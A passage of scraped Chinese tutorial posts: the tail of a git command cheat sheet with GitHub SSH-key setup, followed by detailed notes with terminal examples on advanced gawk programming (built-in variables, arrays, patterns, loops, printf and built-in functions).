将HEAD重置到上一次提交的版本，并将之后的修改标记为未添加到缓存区的修改\n$ git reset <commit>\n\n# 将HEAD重置到上一次提交的版本，并保留未提交的本地修改\n$ git reset --keep <commit>\n\n# 放弃工作目录下的所有修改\n$ git reset --hard HEAD\n\n# 将HEAD重置到指定的版本，并抛弃该版本之后的所有修改\n$ git reset --hard <commit-hash>\n\n# 用远端分支强制覆盖本地分支\n$ git reset --hard <remote/branch> e.g., upstream/master, origin/my-feature\n\n# 放弃某个文件的所有本地修改\n$ git checkout HEAD <file>\n删除添加.gitignore文件前错误提交的文件\n$ git rm -r --cached .\n$ git add .\n$ git commit -m \"remove xyz file\"\n撤销远程修改\n创建一个新的提交，并回滚到指定版本\n$ git revert <commit-hash>\n彻底删除指定版本\n# 执行下面命令后，commit-hash 提交后的记录都会被彻底删除，使用需谨慎\n$ git reset --hard <commit-hash>\n$ git push -f\n更新与推送\n更新\n# 下载远程端版本，但不合并到HEAD中\n$ git fetch <remote>\n\n# 将远程端版本合并到本地版本中\n$ git pull origin master\n\n# 以rebase方式将远端分支与本地合并\n$ git pull --rebase <remote> <branch>\n推送\n# 将本地版本推送到远程端\n$ git push remote <remote> <branch>\n\n# 删除远程端分支\n$ git push <remote> :<branch> (since Git v1.5.0)\n$ git push <remote> --delete <branch> (since Git v1.7.0)\n\n# 发布标签\n$ git push --tags\n查看信息\n显示工作路径下已修改的文件\n$ git status\n显示与上次提交版本文件的不同\n$ git diff\n显示提交历史\n# 从最新提交开始，显示所有的提交记录（显示hash， 作者信息，提交的标题和时间）\n$ git log\n\n# 显示某个用户的所有提交\n$ git log --author=\"username\"\n\n# 显示某个文件的所有修改\n$ git log -p <file>\n显示搜索内容\n# 从当前目录的所有文件中查找文本内容\n$ git grep \"Hello\"\n\n# 在某一版本中搜索文本\n$ git grep \"Hello\" v2.5\n分支与标签\n增删查分支\n# 列出所有的分支\n$ git branch\n\n# 列出所有的远端分支\n$ git branch -r\n\n# 基于当前分支创建新分支\n$ git branch <new-branch>\n\n# 基于远程分支创建新的可追溯的分支\n$ git branch --track <new-branch> <remote-branch>\n\n# 删除本地分支\n$ git branch -d <branch>\n\n# 强制删除本地分支，将会丢失未合并的修改\n$ git branch -D <branch>\n切换分支\n# 切换分支\n$ git checkout <branch>\n\n# 创建并切换到新分支\n$ git checkout -b <branch>\n标签\n# 给当前版本打标签\n$ git tag <tag-name>\n\n# 给当前版本打标签并附加消息\n$ git tag -a <tag-name>\n合并与重置\n\nmerge 与 rebase 虽然是 git 常用功能，但是强烈建议不要使用 git 命令来完成这项工作。\n因为如果出现代码冲突，在没有代码比对工具的情况下，实在太艰难了。\n你可以考虑使用各种 Git GUI 工具。\n\n合并\n# 将分支合并到当前HEAD中\n$ git merge <branch>\n重置\n# 将当前HEAD版本重置到分支中，请勿重置已发布的提交\n$ git rebase <branch>\nGithub\nGithub 作为最著名的代码开源协作社区，在程序员圈想必无人不知，无人不晓。\n这里不赘述 Github 的用法，确实有不会用的新手同学，可以参考官方教程：https://guides.github.com/\nclone 方式\nGit 支持三种协议：HTTPS / SSH / GIT\n而 Github 上支持 HTTPS 和 SSH。\nHTTPS 这种方式要求你每次 push 时都要输入用户名、密码，有些繁琐。\n而 SSH 要求你本地生成证书，然后在你的 Github 账户中注册。第一次配置麻烦是麻烦了点，但是以后就免去了每次 push 需要输入用户名、密码的繁琐。\n\n以下介绍以下，如何生成证书，以及在 Github 中注册。\n生成 SSH 公钥\n如前所述，许多 Git 服务器都使用 SSH 公钥进行认证。 为了向 Git 服务器提供 SSH 公钥，如果某系统用户尚未拥有密钥，必须事先为其生成一份。 这个过程在所有操作系统上都是相似的。 首先，你需要确认自己是否已经拥有密钥。 默认情况下，用户的 SSH 密钥存储在其 ~/.ssh 目录下。 进入该目录并列出其中内容，你便可以快速确认自己是否已拥有密钥：\n$ cd ~/.ssh\n$ ls\nauthorized_keys2  id_dsa       known_hosts\nconfig            id_dsa.pub\n我们需要寻找一对以 id_dsa 或 id_rsa 命名的文件，其中一个带有 .pub 扩展名。 .pub 文件是你的公钥，另一个则是私钥。 如果找不到这样的文件（或者根本没有 .ssh 目录），你可以通过运行 ssh-keygen 程序来创建它们。在 Linux/Mac 系统中，ssh-keygen 随 SSH 软件包提供；在 Windows 上，该程序包含于 MSysGit 软件包中。\n$ ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/schacon/.ssh/id_rsa):\nCreated directory '/home/schacon/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/schacon/.ssh/id_rsa.\nYour public key has been saved in /home/schacon/.ssh/id_rsa.pub.\nThe key fingerprint is:\nd0:82:24:8e:d7:f1:bb:9b:33:53:96:93:49:da:9b:e3 schacon@mylaptop.local\n首先 ssh-keygen 会确认密钥的存储位置（默认是 .ssh/id_rsa），然后它会要求你输入两次密钥口令。如果你不想在使用密钥时输入口令，将其留空即可。\n现在，进行了上述操作的用户需要将各自的公钥发送给任意一个 Git 服务器管理员（假设服务器正在使用基于公钥的 SSH 验证设置）。 他们所要做的就是复制各自的 .pub 文件内容，并将其通过邮件发送。 公钥看起来是这样的：\n$ cat ~/.ssh/id_rsa.pub\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAklOUpkDHrfHY17SbrmTIpNLTGK9Tjom/BWDSU\nGPl+nafzlHDTYW7hdI4yZ5ew18JH4JW9jbhUFrviQzM7xlELEVf4h9lFX5QVkbPppSwg0cda3\nPbv7kOdJ/MTyBlWXFCR+HAo3FXRitBqxiX1nKhXpHAZsMciLq8V6RjsNAQwdsdMFvSlVK/7XA\nt3FaoJoAsncM1Q9x5+3V0Ww68/eIFmb1zuUFljQJKprrX88XypNDvjYNby6vw/Pb0rwert/En\nmZ+AW4OZPnTPI89ZPmVMLuayrD2cE86Z/il8b+gw3r3+1nKatmIkjn2so1d01QraTlMqVSsbx\nNrRFi9wrf+M7Q== schacon@mylaptop.local\n在你的 Github 账户中，依次点击 Settings > SSH and GPG keys > New SSH key\n然后，将上面生成的公钥内容粘贴到 Key 编辑框并保存。至此大功告成。\n后面，你在克隆你的 Github 项目时使用 SSH 方式即可。\n\n如果觉得我的讲解还不够细致，可以参考：https://help.github.com/articles/adding-a-new-ssh-key-to-your-github-account/\n小结\n最后，放一张我总结的脑图总结一下以上的知识点。\n\n资料\ngit 官网 | git 官方 Github\n廖雪峰的 git 教程\ngit-cheat-sheet\ngithub-cheat-sheet\nGithub gitignore 模板\n"},{"title":"《Linux命令行与shell脚本编程大全》第二十二章 gawk进阶","body":"gawk是一门功能丰富的编程语言，你可以通过它所提供的各种特性来编写好几程序处理数据。 \n22.1 使用变量\ngawk编程语言支持两种不同类型的变量：\n内建变量和自定义变量\n \n22.1.1 内建变量\ngawk程序使用内建变量来引用程序数据里的一些特殊功能\n \n1.字段和记录分隔符变量\n数据字段变量：允许你使用美元符和字段在该记录中的位置值来引用记录对应的字段。\n要引用第一个字段就用变量$1，第二个就用$2,….以此类推。\n \n数据字段是由分隔符来划定的。默认字段分隔符是一个空白字符，也就是空格或者制表符。\n \n有一组内建变量用于控制gawk如何处理输入输出数据中的字段和记录，见下表：\n\n\n\n\n变量\n\n\n描述\n\n\n\n\nFIELDWIDTHS\n\n\n有空格分隔的一列数字，定义每个数据字段的确切宽度\n\n\n\n\nFS\n\n\n输入字段分隔符\n\n\n\n\nRS\n\n\n输入记录分隔符\n\n\n\n\nOFS\n\n\n输出字段分隔符\n\n\n\n\nORS\n\n\n输出记录分隔符\n\n\n\n\n \n1）print命令会自动将OFS变量的值放置在输出中的每个字段间。\n实例：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1 \ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"; OFS=\"-\"} {print $1,$2,$3}' data1 \ndata11-data12-data13\ndata21-data22-data23\ndata31-data32-data33\ndata41-data42-data43\ndata51-data52-data53\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"; OFS=\"<-->\"} {print $1,$2,$3}' data1 \ndata11<-->data12<-->data13\ndata21<-->data22<-->data23\ndata31<-->data32<-->data33\ndata41<-->data42<-->data43\ndata51<-->data52<-->data53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n2） FIELDWIDTHS变量允许你不依靠字段分割符来读取记录。一旦这是了FILEDWIDTFS变量，gawk就会忽略FS变量。\n警告：一旦设定了FIELDWIDTHS变量的值，就不能再改变了。这种方法并不适用于变长的字段\n \n有写数据没有指定分隔符，而是放在特定的列，这时候就可以用FIELDWIDTHS了：\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data2\n1005.3246782.37\n115-2.343324.08\n05828.3452433.1\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FIELDWIDTHS=\"3 5 2 5\"} {print $1,$2,$3,$4}' data2\n100 5.324 67 82.37\n115 -2.34 33 24.08\n058 28.34 52 433.1\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n3）RS和ORS定义了gawk程序如何处理数据流中的字段。默认这两个都是换行符\n默认的RS表明，输入数据流中的每行新文本就是一条新记录\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\"\\n\";RS=\"\"} {print $1, $4}' data3\nkobe bryant 99038\nPaul Gaoso 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\"\\n\";RS=\"\"} {print $1, $2}' data3\nkobe bryant 24 Los Lakers\nPaul Gaoso 15 los Lakers\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n上面的例子中，4行才是一条记录，所以指定FS=”\\n”\n每行只是一个字段。\n如何判断一个新的数据行的开始：解决方法计算RS变量设为空。然后在数据记录之间留一个空白行。gawk会把每个空白行当做一个记录分隔符。\n \n说明：\n默认的字段分隔符是空格，记录分割符是换行符\n上面的例子把字段分割符改成了换行符，记录分隔符编程了空白行（RS=””）\n \n2. 数据变量\n还有一些其他的内建变量：\n\n\n\n\n变量\n\n\n描述\n\n\n\n\nARGC\n\n\n当前命令行参数个数\n\n\n\n\nARGIND\n\n\n当前文件在ARGV的位置\n\n\n\n\nARGV\n\n\n包含命令行参数的数组\n\n\n\n\nCONVFMT\n\n\n数字的转换格式，模式是%.6 g\n\n\n\n\nENVIRON\n\n\n当前shell环境变量及其值组成的关联数组\n\n\n\n\nERRNO\n\n\n当读取或关闭文件发生错误时的系统错误号\n\n\n\n\nFILENAME\n\n\n用作输入数据的数据文件的文件名\n\n\n\n\nFNR\n\n\n当前数据文件的数据行数\n\n\n\n\nIGNORECASE\n\n\n设成非零值，忽略gawk命令中出现的字符串的字符大小写\n\n\n\n\nNF\n\n\n数据文件中的字段总数\n\n\n\n\nNR\n\n\n已处理的输入记录数\n\n\n\n\nOFMT\n\n\n数字的输出格式，默认值%.6 g\n\n\n\n\nRLENGTH\n\n\n由match函数所匹配的字符串的长度\n\n\n\n\nRSTART\n\n\n由match函数所匹配的字符串的起始位置\n\n\n\n\n \n实例1：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ARGC,ARGV[1]}' data2\n2 data2\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ENVIRON[\"HOME\"]}'\n/home/xcy\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ENVIRON[\"HOME\"]; print ENVIRON[\"PATH\"]}'\n/home/xcy\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/sbin/:/usr/bin:/usr/sbin:/home/xcy/Bt_A7/Bt_A7/gcc-linaro-arm-linux-gnueabihf-4.9-2014.09_linux/bin\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n ENVIRON[“HOME”] 从系统中提取HOME环境变量的值。\n \n例子2：\n当要在gawk程序中跟踪数据字段和记录时，变量FNR，NF和NR就非常方便了。\nNF变量可以在你不知道具体位置的情况下指定记录中的最后一个数据字段：\n$gawk ‘BEGIN{FS=”:”; OFS=”:”} {print $1, $NF}’ /etc/passwd\n假设NF为7，那么相当于是$7。打印最后一个字段\n \n例子3：\nFNR变量含有当前数据文件中已处理过的记录数\nNR变量则含有已处理过的记录总数\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} {print $1,\"FNR=\"FNR}' data1 \ndata11 FNR=1\ndata21 FNR=2\ndata31 FNR=3\ndata41 FNR=4\ndata51 FNR=5\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} {print $1,\"FNR=\"FNR, \"NR=\"NR} END{print \"There were \",NR,\" recordes\"}' data1 data1\ndata11 FNR=1 NR=1\ndata21 FNR=2 NR=2\ndata31 FNR=3 NR=3\ndata41 FNR=4 NR=4\ndata51 FNR=5 NR=5\ndata11 FNR=1 NR=6\ndata21 FNR=2 NR=7\ndata31 FNR=3 NR=8\ndata41 FNR=4 NR=9\ndata51 FNR=5 NR=10\nThere were  10  recordes\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n当处理第2个文件时，FNR又被置成1了，但是NR还是继续增加的。\n \n注意：\n1）在shell脚本中使用gawk时，应该将gawk的命令放到不同的行，便于理解和阅读\n2）如果在不同的shell脚本中使用了相同的gawk脚本，应该把gawk放在一个单独的文件中。再用-f参数去引用它。\n \n \n22.1.2自定义变量\n变量名可以是字母下划线开头，还可以有数字。并且变量名区分大小写\n1.在脚本中给变量赋值\n可以对变量进行修改，可以进行数学运算\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> test=\"hahaha, i am test\"\n> print test}'\nhahaha, i am test\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\nBEGIN{\ntest=\"hahaha, i am test\"\nprint test\n> test=156\n> print test\n> }'\nhahaha, i am test\n156\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> x=4\n> x=x*3+4\n> print x\n> }'\n16\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n2. 在命令行上给变量赋值\n也可以用gawk命令行来给程序中的变量赋值。这允许你在正常的代码之外赋值。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script \nBEGIN{FS=\",\"}\n{print $n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script n=3 data1\ndata13\ndata23\ndata33\ndata43\ndata53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n上面可以给n进行赋值，改变脚本的行为。\n这样可以在不改变脚本代码的情况下就能改变脚本的行为\n上面这样存在的问题是设置的变量在代码的BEGIN部分不可用\n \n解决方法，用-v参数。它允许你在BEGIN代码之前设定变量，要放在脚本代码之前。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script2\nBEGIN{print \"The starting value is\",n; FS=\",\"}\n{print $n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -v n=4 -f script2 data1\nThe starting value is 4\ndata14\ndata24\ndata34\ndata44\ndata54\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.2 处理数组\ngawk编程语言使用关联数组提供数组功能\n关联数组跟数字数组不同之处在于它的索引值可以是任意文本字符串。\n不需要用连续的数字来标识数组元素。关联数组用各种字符串来引用值\n每个索引字符串都必须能够唯一标识赋给它的数据元素\n \n22.2.1 定义数组变量\n用标准赋值语句来定义数组变量。格式如下：\nvar[index]=element\nvar是变量名，index是关联数组的索引值 element是数据元素值\n例子：\n这里要加双引号，数字不用加，字符串需要加\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '                      \nBEGIN{\nnba[\"kobe\"]=\"bryant\"\nnba[\"cp3\"]=\"paul\"\nprint nba[\"kobe\"]\nprint nba[\"cp3\"]\n}'\nbryant\npaul\n# 还可以进行数学运算。\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> arr[1]=99\n> arr[2]=77\n> total=arr[1] + arr[2]\n> print \"total =\",total\n> }'\ntotal = 176\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n22.2.2 遍历数组变量\n关联数组的索引可以是任何东西\n遍历数组可以用for语句的一种特殊形式：\nfor (var in array)\n{\n  statements\n}\n这个for语句会在每次循环时都将关联数组array的下一个索引值赋值给变量var，然后执行一遍statements\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script3\nBEGIN{\nvar[\"a\"]=\"hahah\"\nvar[\"b\"]=2\nvar[\"c\"]=\"yutong keche\"\nvar[\"d\"]=4\n \n \nfor (test in var)\n{\n         print \"Index:\",test,\" - Value:\",var[test]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script3\nIndex: a  - Value: hahah\nIndex: b  - Value: 2\nIndex: c  - Value: yutong keche\nIndex: d  - Value: 4\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.2.3删除数组变量\n格式如下：\ndelete array[index]\n删除以后就没办法再用它来提取元素值了。\n比如：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script4\nBEGIN{\nvar[\"a\"]=\"hahah\"\nvar[\"b\"]=2\nvar[\"c\"]=\"yutong keche\"\nfor (test in var)\n{\n         print \"old: Index:\",test,\" - Value:\",var[test]\n}\nprint \"Now,delete array:\"\ndelete var[\"c\"]\n \nfor (test in var)\n{\n         print \"new: Index:\",test,\" - Value:\",var[test]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script4\nold: Index: a  - Value: hahah\nold: Index: b  - Value: 2\nold: Index: c  - Value: yutong keche\nNow,delete array:\nnew: Index: a  - Value: hahah\nnew: Index: b  - Value: 2\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.3 使用模式\ngawk支持多种类型的匹配模式来过滤数据记录。\nBEGIN和END关键字用来读取数据流之前或之后执行命令的特殊模式\n \n22.3.1 正则表达式\n可以用基础正则表达式（BRE）或扩展正则表达式（ERE）来选择程序脚本作用在数据流中的哪些行上。\n \n使用正则表达式时，正则表达式必须出现在它要控制的程序脚本的左花括号前。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script5\nBEGIN{FS=\",\"}\n/11/{print $1, $2}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script5 data1\ndata11 data12\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n正则表达式/11/匹配了字段中含有字符串11的记录。\n \n \n22.3.2 匹配操作符\n匹配操作符允许将正则表达式限定在记录中的特定数据字段。匹配操作符是~。\n可以指定匹配操作符，数据字段变量以及要匹配的正则表达式\n$1 ~ /^data/\n$1变量代表记录中的第一个数据字段。\n上面的例子会过滤出以data开头的所有记录。\n取反： $1 !~ /^data1/   匹配第一个字段不以data1开头的记录\n例子2：\n// 匹配第2个字段为data2开头的记录，并且打印第1和第3个字段。$2表示第2个字段\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1\ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} $2 ~ /^data2/{print $1, $3}' data1   data21 data23\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} $2 !~ /^data2/{print $1, $3}' data1  // 这里还可以取反，匹配第二个字段不以data2开头的记录。加个感叹号\ndata11 data13\ndata31 data33\ndata41 data43\ndata51 data53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n例子3：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\":\"} $1 ~ /^xcy/{print $1,\":\" $NF}' /etc/passwd\nxcy :/bin/bash\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n例子4：! 用来排除正则表达式中的匹配\n\n$ gawk -F: '$1 !~ /^xcy|^root/{print $1, \":\" $NF}' /etc/passwd\n\n-F 用来指定主句字段的分隔符\n上面表明过滤第一个字段不以xcy开头，或不以root开头。\n \n22.3.3 数学表达式\n还可以在匹配模式中用数学表达式。\n例子：想显示所有属于root用户组（组ID为0）的系统用户\n$gawk –F: ‘$4 == 0{print $1}’ /etc/passwd\n还可以用任何常见的数学比较表达式： ==  <=  >=  >  <\n \n匹配字符串：注意这时候是完全匹配\n$gawk –F, ‘$1==”data” {print $1}’ data1\n第一个字段必须是data，而不是包含data\n \n22.4 结构化命令\n \n22.4.1 if语句\n给if语句定义一个求值的条件，并将其用圆括号括起来。\n条件为真在if后面的语句就会执行。\n还可以接上else。和C语言的差不多\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data4\n3\n5\n34\n467\n1\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat ifscript \n{\n         if ($1 > 29)\n         {\n                   print \"$1 > 29\"  # 多条命令需要用{}括起来\n                   print $1\n         }\n         else if($1 == 3)  \n         {\n                   print \"step 2 $1 == 3\"\n         }        \n         else\n         {\n                   print \"step 3 \"\n         }\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f ifscript data4\nstep 2 $1 == 3\nstep 3 \n$1 > 29\n34\n$1 > 29\n467\nstep 3 \nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n还可以在单行上使用else子句，这样就需要在if后面接上分号；\n$ gawk '{if($1 == 3) print $1\" == 3 \"; else print $1,\"!= 3\"}' data4\n \n22.4.2 while 语句\n基本格式：\nwhile (condition)\n{\n  statement\n}\n \nwhile里面还可以放break和continue。用起来跟C语言一样\n \n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data5\n100 110 120\n170 180 190 \n300 310 320\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script6 \n{\ntotal=0\ni=1\nwhile(i < 4)\n{\n         total += $i\n         i++\n         if(i==3)\n         {\n                   break\n                   #continue\n         }\n         print \"i=\", i\n}\navg=total/3\nprint \"Average:\",avg\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script6 data5\ni= 2\nAverage: 70\ni= 2\nAverage: 116.667\ni= 2\nAverage: 203.333\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n \n22.4.3 do-while语句\n和while语句类似，但是会在检查条件语句之前执行命令。格式如下：\ndo\n{\n  statement\n} while(condition)\n \n这种格式保证了语句在条件被求值之前至少执行一次\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script7\n{\ntotal=0\ni=1\ndo\n{\n         total += $i\n         i++\n} while(total < 300)\nprint \"total:\",total,\"i=\",i\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script7 data5\ntotal: 330 i= 4\ntotal: 350 i= 3\ntotal: 300 i= 2\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.4.4 for语句\n支持C风格的for循环：\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script8 \n{\ntotal=0\nfor(i=1; i<4; i++)\n{\n         total += $i\n}\navg=total/3\nprint \"Total:\",total,\"Average:\",avg\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script8 data5\nTotal: 330 Average: 110\nTotal: 540 Average: 180\nTotal: 930 Average: 310\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n22.5 格式化打印\nprint打印在如何显示数据上并未提供多少控制。\n下面介绍一个格式化打印命令，printf，和C语言的那个有点类似：\nprintf “format string” ,var1,var2…\n前面也是格式化命令。跟C语言很像：\n1）\n%c 输出字符， %d 整数值， %i 整数值，%e 用科学计数法显示数\n%f 浮点数，%g 科学计数法或浮点数显示（较短的）\n%o 八进制，%s 字符串\n%x 十六进制小写，%X 十六进制大写\n2）\n还有三种修饰符可以用来进一步控制输出\nwidth：指定输出字段最小宽度的数字值。实际比这短，则会补充空格，否则按正常输出\nprec：指定浮点数中小数点后面的位数。或者文本字符串中显示的最大字符数\n-(减号)：指明在格式化空间中放入数据时采用左对齐，而不是右对齐\n例子：\n\n$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%s %s\\n\", $1,$2}' data3  #正常输出\nkobe bryant 24 Los Lakers\nPaul Gaoso 15 los Lakers\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%16s %s\\n\", $1,$2}' data3  #指定输出字段最小宽度\n     kobe bryant 24 Los Lakers\n      Paul Gaoso 15 los Lakers\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%-16s %s\\n\", $1,$2}' data3  #指定左对齐\nkobe bryant      24 Los Lakers\nPaul Gaoso       15 los Lakers\n\n还可以指定浮点数格式\n… {printf “%5.1f\\n”, avg} …\n占5位，小数点后只显示一位。\n \n22.6 内建函数\ngawk提供了不少内建的函数，可以进行常见的数学 字符串以及时间函数运算\n \n22.6.1 数学函数\n\n\n\n\n函数\n\n\n描述\n\n\n\n\natan2(x,y)\n\n\nx/y的反正切，x y以弧度为单位\n\n\n\n\ncos(x)\n\n\nX的余弦 x以弧度为单位\n\n\n\n\nexp(x)\n\n\nX的指数函数\n\n\n\n\nint(x)\n\n\nX的整数部分，取靠近零一侧的值\n\n\n\n\nlog(x)\n\n\nX的自然对数\n\n\n\n\nrand(x)\n\n\n比0大比1小的随机浮点数\n\n\n\n\nsin(x)\n\n\n正弦，x以弧度为单位\n\n\n\n\nsqrt(x)\n\n\nX的平方根\n\n\n\n\nsrand(x)\n\n\n为计算随机数指定一个种子值\n\n\n\n\nand(v1,v2)\n\n\n执行v1和v2的按位与运算\n\n\n\n\ncompl(val)\n\n\n执行val的补运算\n\n\n\n\nlshift(val,count)\n\n\nVal的值左移count位\n\n\n\n\nor(v1,v2)\n\n\nV1和v2的按位或运算\n\n\n\n\nrshift(val,count)\n\n\nVal右移count位\n\n\n\n\nxor(v1,v2)\n\n\nV1和v2的异或运算\n\n\n\n\n \n例子：\n\n$ gawk 'BEGIN{x=rand(); print \"x =\",x}'\n$gawk 'BEGIN{x=int(-7.6); print \"x =\",x}'\n$ gawk 'BEGIN{x=sin(1.57); print \"x =\",x}'\n$ gawk 'BEGIN{x=int(10*rand()); print \"x =\",x}'\n$ gawk 'BEGIN{x=and(1,2); print \"x =\",x}'\n$ gawk 'BEGIN{x=lshift(1,2); print \"x =\",x}'\n$ gawk 'BEGIN{x=xor(1,2); print \"x =\",x}'\n\n \n22.6.2 字符串函数\n \n\n\n\n\n函数\n\n\n描述\n\n\n\n\nasort(s [,d])\n\n\n将数组s按数据元素值排序。索引值会被替换成表示新的排序顺序的连续数字。另外如果指定了d，则排序后的数组会存储在数组d中。\n\n\n\n\nasorti(s [,d])\n\n\n将数组s按索引值排序。生成的数组会将索引值作为数据元素值，用连续数字所以来表明排序顺序。若指定了d，排序后是数组会存在d中\n\n\n\n\ngensub(r,s,h [,t])\n\n\n查找变量$0或目标字符串t（若提供的话）来匹配正则表达式r。\n如果h是一个以g或G开头的字符串，就用s替换掉匹配的文本。\n如果h是数字，它表示要替换掉的第h处r匹配的地方\n\n\n\n\ngsub(r,s [,t])\n\n\n查找变量$0或目标字符串t(若提供的话)来匹配正则表达式。\n如果找到了就全部替换成字符串s\n\n\n\n\nindex(s,t)\n\n\n返回字符串t在字符串s中的索引值。如果没找到返回0\n\n\n\n\nlength([s])\n\n\n返回字符串s的长度，如果没有指定的话返回$0的长度\n\n\n\n\nmatch(s, r [,a])\n\n\n返回字符串s中正则表达式r出现位置的索引。若指定数组a，则会存储s中匹配正则表达式的那部分\n\n\n\n\nsplit(s, a [,r])\n\n\n将s用FS字符或正则表达式r（若指定的话）分开放到数组a中。返回字段总数\n\n\n\n\nsprintf(format,variables)\n\n\n用提供的format和variables返回一个类似于printf输出的字符串\n\n\n\n\nsub(r,s [,t])\n\n\n在变量$0或目标字符串t中查找正则表达式t的匹配。若找到了，就用字符串s替换掉第一处匹配\n\n\n\n\nsubstr[s,i [,n]]\n\n\n返回s从索引值i开始的n个字符组成的字符串。若未提供n，则返回s剩下的部分\n\n\n\n\ntolower(s)\n\n\n全部转小写\n\n\n\n\ntoupper(s)\n\n\n全部转大写\n\n\n\n\n \n \n有些用起来比较简单，比如大小写，求长度\n\n$ gawk 'BEGIN{x=length(\"chong\"); print \"x =\",x}'\n$ gawk 'BEGIN{x=toupper(\"chong\"); print \"x =\",x}'\n\n \n下面是asort的例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script9\nBEGIN{\nvar[\"a\"]=177\nvar[\"b\"]=9\nvar[\"c\"]=3\nvar[\"d\"]=4444\nvar[\"e\"]=566\nasort(var,test)\nfor (i in test)\n{\n         print \"Index:\",i,\"-value:\",test[i]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script9\nIndex: 4 -value: 566\nIndex: 5 -value: 4444\nIndex: 1 -value: 3\nIndex: 2 -value: 9\nIndex: 3 -value: 177\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n注意看对var数组的数据元素进行排序了。排序后的数组放在test数组里面了。\n索引值被替换成了数字。索引最大的对应数据元素也是最大的。\n \n下面是split的例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1 